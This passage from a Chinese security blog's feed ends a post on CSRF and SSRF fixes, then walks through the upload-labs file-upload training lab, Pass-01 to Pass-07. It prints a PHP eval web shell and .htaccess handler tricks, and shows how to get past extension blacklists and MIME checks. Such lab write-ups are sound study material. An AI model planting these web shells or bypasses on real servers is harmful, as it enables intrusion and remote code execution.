&lt;p&gt;&lt;img src=&#34;csrf02.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;修复建议：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;在服务器端生成随机 token，浏览器在发起针对数据的修改请求将 token 提交，由服务器端验证通过够进行操作逻辑，token 需要至多一次有效，并具有有限的生命周期&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;通过检查 refer 值，判断请求是否合法 (下面的代码就是典型的反例)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;针对需要用户授权的请求，提示用户输入身份认证后再继续操作&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;针对频繁操作提示输入验证码后再继续进行操作&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;csrf–&amp;gt;CSRFFeedback（7）&lt;/p&gt;
&lt;p&gt;新增判断了 contentType。&lt;/p&gt;
&lt;p&gt;拦截请求包生成的 poc 中，enctype=“text/plain”，我们要发送的 json 格式的数据都被隐藏在 input 的 name 中，其余同上&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;csrf2.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;测试截图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;csrf03.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;ssrf&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ssrf&#34;&gt;#&lt;/a&gt; SSRF&lt;/h1&gt;
&lt;h2 id=&#34;漏洞描述-11&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞描述-11&#34;&gt;#&lt;/a&gt; 漏洞描述&lt;/h2&gt;
&lt;p&gt;服务端请求伪造攻击（SSRF）也成为跨站点端口攻击，是由于一些应用在 9 向第三方主机请求资源时提供了 URL 并通过传递的 URL 来获取资源引起的，当这种功能没有对协议、网络可信便捷做好限制时，攻击者可利用这种缺陷来获取内网敏感数据、DOS 内网服务器、读文件甚至于可获取内网服务器控制权限等。&lt;/p&gt;
&lt;h2 id=&#34;漏洞成因-10&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞成因-10&#34;&gt;#&lt;/a&gt; 漏洞成因&lt;/h2&gt;
&lt;p&gt;服务端提供了从其他服务器应用获取数据的功能，且没有对目标地址做过滤或者限制，比如说从指定 url 地址获取网页文本内容，加载指定地址的图片，文档等等.&lt;/p&gt;
&lt;h2 id=&#34;代码片段以及修复建议-10&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#代码片段以及修复建议-10&#34;&gt;#&lt;/a&gt; 代码片段以及修复建议&lt;/h2&gt;
&lt;p&gt;两个任务都是根据用户输入的参数，进行判断输入，并没有任何过滤&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;ssrf1.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;ssrf2.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;测试截图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;ssrf3.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;ssrf4.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;修复建议：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;禁用不需要的协议。仅仅允许 http 和 https 请求。可以防止 file://,gopher://,&lt;a href=&#34;ftp://%E7%AD%89%E5%BC%95%E8%B5%B7%E7%9A%84%E9%97%AE%E9%A2%98&#34;&gt;ftp:// 等引起的问题&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;统一错误信息，防止利用错误信息来判断远端服务器的端口状态.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;禁止 302 跳转，或每跳转一次检查新的 host 是否为内网 ip, 后禁止&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;设置 url 名单或者限制内网 ip.&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;h1 id=&#34;最后想说的&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#最后想说的&#34;&gt;#&lt;/a&gt; 最后想说的&lt;/h1&gt;
&lt;p&gt;要好好努力，跟着自己的节奏，会越来越好的 o (￣ε￣*)&lt;/p&gt;
&lt;p&gt;还有还有，谢谢小甜甜一直的陪伴，爱您♡&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/2020/11/25/upload-labs%E5%9F%BA%E7%A1%80%E5%85%B3%E5%8D%A1/</guid>
            <title>upload-labs基础关卡</title>
            <link>http://example.com/2020/11/25/upload-labs%E5%9F%BA%E7%A1%80%E5%85%B3%E5%8D%A1/</link>
            <category>文件上传靶场</category>
            <pubDate>Wed, 25 Nov 2020 21:24:52 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;pass-01&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pass-01&#34;&gt;#&lt;/a&gt; Pass-01&lt;/h1&gt;
&lt;h2 id=&#34;过程&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程&#34;&gt;#&lt;/a&gt; 过程&lt;/h2&gt;
&lt;p&gt;第一关，通常随便传把哈哈哈&lt;/p&gt;
&lt;p&gt;来个 php 一句话&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	@&lt;span class=&#34;keyword&#34;&gt;eval&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;hqxx&amp;#x27;&lt;/span&gt;]);    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;哦豁，弹窗提示了：该文件不允许上传，请上传.jpg|.png|.gif 类型的文件，当前文件类型为：.php&lt;/p&gt;
&lt;p&gt;弹窗提示，没有发请求包，说明是前端验证了，那就去找 js 验证代码，干掉他&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;upload-labs-01-01.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;方法 1：Ctrl+F 找哪个标签用了这个函数，删掉它，然后点击上传&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;upload-labs-01-02.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;方法 2：复制 checkFile 函数，将.php 类型加进白名单，在控制台输入运行后点击上传&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;function checkFile() &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    var file = document.getElementsByName(&amp;#x27;upload_file&amp;#x27;)[0].value;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if (file == null || file == &amp;quot;&amp;quot;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        alert(&amp;quot;请选择要上传的文件!&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        return false;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    //定义允许上传的文件类型&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    var allow_ext = &amp;quot;.jpg|.png|.gif|.php&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    //提取上传文件的类型&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    var ext_name = file.substring(file.lastIndexOf(&amp;quot;.&amp;quot;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    //判断上传文件类型是否允许上传&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if (allow_ext.indexOf(ext_name) == -1) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        var errMsg = &amp;quot;该文件不允许上传，请上传&amp;quot; + allow_ext + &amp;quot;类型的文件,当前文件类型为：&amp;quot; + ext_name;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        alert(errMsg);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        return false;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;上传后通过查看器得到文件路径&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;upload-labs-01-03.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;上菜刀&lt;/p&gt;
&lt;p&gt;菜刀没上去，上蚁剑&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;upload-labs-01-04.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;upload-labs-01-05.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;总结&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结&#34;&gt;#&lt;/a&gt; 总结&lt;/h2&gt;
&lt;p&gt;在控台运行函数的方法，我还是一个月之前才知道的（别说 de），明明很容易想到或者尝试到的点…&lt;/p&gt;
&lt;p&gt;感觉还是要脑洞大一点，多尝试一些&lt;/p&gt;
&lt;h1 id=&#34;pass-02&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pass-02&#34;&gt;#&lt;/a&gt; Pass-02&lt;/h1&gt;
&lt;p&gt;date：2020-11-25 22:01:47&lt;/p&gt;
&lt;h2 id=&#34;过程-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-2&#34;&gt;#&lt;/a&gt; 过程&lt;/h2&gt;
&lt;p&gt;通过查看器，找到前端的 onsubmit 事件，但是删除后，还是判定文件类型不正确&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;upload-labs-02-01.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;并没有在前端看见 js 代码，应该是后台判断了&lt;/p&gt;
&lt;p&gt;看一下提示：本 pass 在服务端对数据包的 MIME 进行检查！&lt;/p&gt;
&lt;p&gt;上传文件，bp 抓包，更改 MIME 类型为 image/png，同时得到路径&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;upload-labs-02-02.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;上蚁剑连接即可。&lt;/p&gt;
&lt;h2 id=&#34;总结-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-2&#34;&gt;#&lt;/a&gt; 总结&lt;/h2&gt;
&lt;p&gt;真百度了好多次了，每次都忘记&lt;/p&gt;
&lt;p&gt;“MIME 的全称是 Multipurpose Internet Mail Extensions, 即多用途互联网邮件扩展类型。 这是 HTTP 协议中用来定义文档性质及格式的标准。&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;文件类型&lt;/th&gt;
&lt;th&gt;后缀&lt;/th&gt;
&lt;th&gt;数据包中的文件类型&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;超文本标记语言文本&lt;/td&gt;
&lt;td&gt;.html&lt;/td&gt;
&lt;td&gt;text/html&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;xml 文档&lt;/td&gt;
&lt;td&gt;.xml&lt;/td&gt;
&lt;td&gt;text/xml&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;普通文本文档&lt;/td&gt;
&lt;td&gt;.text&lt;/td&gt;
&lt;td&gt;text/plain&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;RTF 文本&lt;/td&gt;
&lt;td&gt;.rtf&lt;/td&gt;
&lt;td&gt;application/rtf&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;PDF 文档&lt;/td&gt;
&lt;td&gt;.pdf&lt;/td&gt;
&lt;td&gt;application/pdf&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Miscrosoft Word 文件&lt;/td&gt;
&lt;td&gt;.word&lt;/td&gt;
&lt;td&gt;application/msword&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;PNG 图像&lt;/td&gt;
&lt;td&gt;.png&lt;/td&gt;
&lt;td&gt;image/png&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;GIF 图形&lt;/td&gt;
&lt;td&gt;.gif&lt;/td&gt;
&lt;td&gt;image/gif&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;JPEG 图形&lt;/td&gt;
&lt;td&gt;.jpeg,.jpg&lt;/td&gt;
&lt;td&gt;image/jpeg&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;任意的二进制数据&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;application/octet-stream&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;pass-03&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pass-03&#34;&gt;#&lt;/a&gt; Pass-03&lt;/h1&gt;
&lt;p&gt;date：2020-11-25 22:53:30&lt;/p&gt;
&lt;h2 id=&#34;过程-3&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-3&#34;&gt;#&lt;/a&gt; 过程&lt;/h2&gt;
&lt;p&gt;不废话直接传 php 上爆破抓包，send to repeater&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;upload-labs-02-03.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;根据上传 php 文件后的提示，非常有理由认为后台设置了后缀的黑名单&lt;/p&gt;
&lt;p&gt;大小写绕过，没绕过去，空格绕过去了但是不解析，那既然是黑名单，就把后缀改成 php4 呗&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;upload-labs-03-01.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;上蚁剑连接的时候，脚本改成 php4 类型的就可以了&lt;/p&gt;
&lt;h2 id=&#34;总结-3&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-3&#34;&gt;#&lt;/a&gt; 总结&lt;/h2&gt;
&lt;p&gt;据说，空格可以那啥，windows 会忽略空格和点，可是我上传成功不能解析&lt;/p&gt;
&lt;p&gt;然后 00 截断上传，右键看源代码是我的一句话，后来查了一下截断上传的条件：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;php 版本小于 5.3.29&lt;/li&gt;
&lt;li&gt;magic_quotes_gpc = Off&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;唉&lt;/p&gt;
&lt;h1 id=&#34;pass-04&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pass-04&#34;&gt;#&lt;/a&gt; Pass-04&lt;/h1&gt;
&lt;p&gt;date：2020-11-25 23:03:25&lt;/p&gt;
&lt;h2 id=&#34;过程-4&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-4&#34;&gt;#&lt;/a&gt; 过程&lt;/h2&gt;
&lt;p&gt;提示：&lt;/p&gt;
&lt;p&gt;本 pass 禁止上传.php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf 后缀文件！&lt;/p&gt;
&lt;p&gt;看了下源码空格大小写啥的，都被弄了&lt;/p&gt;
&lt;p&gt;但是没有过滤.htaccess 后缀&lt;/p&gt;
&lt;p&gt;要启用.htaccess，要更改 httpd.conf&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;AllowOverride None &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;更改为：AllowOverride All&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;upload-labs-04-01.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;去掉框住这行的注释符号&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;upload-labs-04-02.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;上传.htaccess，所有文件都会解析为 php&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;SetHandler application/x-httpd-php&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;然后上传 hqxx.png 图片马&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt; phpinfo(); &lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;题目也给了路径了，地址栏直接输入就行&lt;/p&gt;
&lt;h2 id=&#34;总结-4&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-4&#34;&gt;#&lt;/a&gt; 总结&lt;/h2&gt;
&lt;p&gt;我最后也没把.png 解析 php 成功&lt;/p&gt;
&lt;p&gt;在.htaccess 里面随便输错误字符，报 500，去看 apache 的日志说我输入的错误字符不对，说明我上传的.htaccess 文件是被解析了的&lt;/p&gt;
&lt;p&gt;把 httpd.conf 里面所有的 AllowOverride None 都改成了 AllowOverride All，重写模块也开了，文件路径也没有问题，php 版本也调低了，phpstudy 也重启了，但永远就是这样：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;upload-labs-04-03.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;我觉得应该还是配置文件的问题，可是到底是哪里出了问题啊！！！&lt;/p&gt;
&lt;p&gt;而后修改 htaccess 为，把文件名包含 hqxx 的文件全部以 php 解析:&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;FilesMatch &amp;quot;hqxx&amp;quot; &amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;SetHandler application/x-httpd-php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/FilesMatch&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;发现 a.php 可以解析成功，而 hqxx.php 不能解析，我真真真呵呵了&lt;/p&gt;
&lt;p&gt;找了好久终于发现有一个人和我一样的问题了，哭唧唧&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.zhaosimeng.cn/zqzb/55.html&#34;&gt;谢谢大哥&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;在新版中 php 环境默认都是带 nts 的，而在旧版本中则可以选择不带，选一个不带 nts 的 php 版本就可以正常玩了，但是我的 phpstudy 里的 php 全是带 nts 的，谢谢您了&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;.htaccess 上传漏洞&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;漏洞形成条件&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;apache 服务器&lt;/li&gt;
&lt;li&gt;能够上传.htaccess 文件，一般为黑名单限制。&lt;/li&gt;
&lt;li&gt;AllowOverride All，默认配置为关闭 None。&lt;/li&gt;
&lt;li&gt;LoadModule rewrite_module modules/mod_rewrite.so #模块为开启状态&lt;/li&gt;
&lt;li&gt;上传目录具有可执行权限。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;.htaccess 文件 (或者 &amp;quot;分布式配置文件&amp;quot;）, 全称是 Hypertext Access (超文本入口)。&lt;/p&gt;
&lt;p&gt;概述来说，htaccess 文件是&lt;a href=&#34;https://baike.baidu.com/item/Apache&#34;&gt; Apache&lt;/a&gt; 服务器中的一个配置文件，它负责相关目录下的网页配置。&lt;/p&gt;
&lt;p&gt;启用.htaccess，需要修改 httpd.conf，启用 AllowOverride，并可以用 AllowOverride 限制特定命令的使用。&lt;/p&gt;
&lt;p&gt;.htaccess 的主要作用就是实现 url 改写，也就是当浏览器通过 url 访问到服务器某个文件夹时，作为主人，我们可以来接待这个 url，具体地怎样接待它，就是此文件的作用。&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.cnblogs.com/gyrgyr/p/10773118.html&#34;&gt;.htaccess 使用方法介绍&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;pass-05&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pass-05&#34;&gt;#&lt;/a&gt; Pass-05&lt;/h1&gt;
&lt;h2 id=&#34;过程-5&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-5&#34;&gt;#&lt;/a&gt; 过程&lt;/h2&gt;
&lt;p&gt;看源码，已经不让上传.htaccess 了，但是这次没有把后缀名全转成小写了，也就是说嘿嘿嘿&lt;/p&gt;
&lt;p&gt;上传 hqxx.phP&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php phpinfo(); ?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;上传成功，地址栏直接输入路径&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;upload-labs-05-01.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;总结-5&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-5&#34;&gt;#&lt;/a&gt; 总结&lt;/h2&gt;
&lt;p&gt;我把 apache 玩崩了，重装都不行，换了 Nginx 哈哈哈&lt;/p&gt;
&lt;p&gt;顺便查了下 nginx 用 htaccess 的方法，&lt;a href=&#34;https://blog.csdn.net/cs729298/article/details/77478155&#34;&gt;想看点我&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&#34;pass-06&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pass-06&#34;&gt;#&lt;/a&gt; Pass-06&lt;/h1&gt;
&lt;h2 id=&#34;过程-6&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-6&#34;&gt;#&lt;/a&gt; 过程&lt;/h2&gt;
&lt;p&gt;看源码，依然是黑名单&lt;/p&gt;
&lt;p&gt;并且将后缀名全部转换为小写了，但是空格啥的没去除了&lt;/p&gt;
&lt;p&gt;在文件名末尾加一个空格上传&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;upload-labs-06-01.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;解析成功&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;upload-labs-06-02.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;总结-6&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-6&#34;&gt;#&lt;/a&gt; 总结&lt;/h2&gt;
&lt;p&gt;利用 Windows 特性 在 Windows 中文件后缀名末尾有空格会自动去掉&lt;/p&gt;
&lt;h1 id=&#34;pass-07&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pass-07&#34;&gt;#&lt;/a&gt; Pass-07&lt;/h1&gt;
&lt;h2 id=&#34;过程-7&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-7&#34;&gt;#&lt;/a&gt; 过程&lt;/h2&gt;
&lt;p&gt;看源码，转换了大小写，去除了首位空格&lt;/p&gt;
&lt;p&gt;那就在文件末尾加。呗&lt;/p&gt;
&lt;p&gt;上传成功，解析成功&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;upload-labs-07-01.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
